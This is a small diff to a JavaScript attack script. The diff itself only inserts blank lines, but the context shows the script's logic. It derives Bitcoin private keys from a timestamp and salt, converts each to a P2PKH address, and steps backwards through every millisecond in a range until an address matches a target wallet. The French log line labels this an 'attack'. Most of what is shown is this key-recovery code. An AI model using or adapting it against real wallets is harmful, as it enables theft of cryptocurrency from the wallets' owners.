@@ -47,6 +47,7 @@ function Pv(seed, func) {
 }
 
 function tp(u, f) {
+
   const r = Wv(f);
   const baseStr = r ? `${u}:${r}` : `${u}`;
   const c = Buffer.from(baseStr, 'utf8');
@@ -77,6 +78,7 @@ function tp(u, f) {
 }
 
 function ep(u, f) {
+
   const privateKeyBytes = tp(u, f);
   const keyPair = bitcoin.ECPair.fromPrivateKey(privateKeyBytes, { network: NETWORK });
   const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
@@ -94,6 +96,7 @@ function runAttack() {
   console.error(`[ATTAQUE] Recherche à rebours (du plus récent au plus ancien).\n`);
 
   for (let ts_ms = END_TIMESTAMP_MS; ts_ms >= START_TIMESTAMP_MS; ts_ms--) {
+    
     try {
       const wallet = ep(ts_ms, SALT_TO_USE);
       if (wallet.address === TARGET_ADDRESS) {
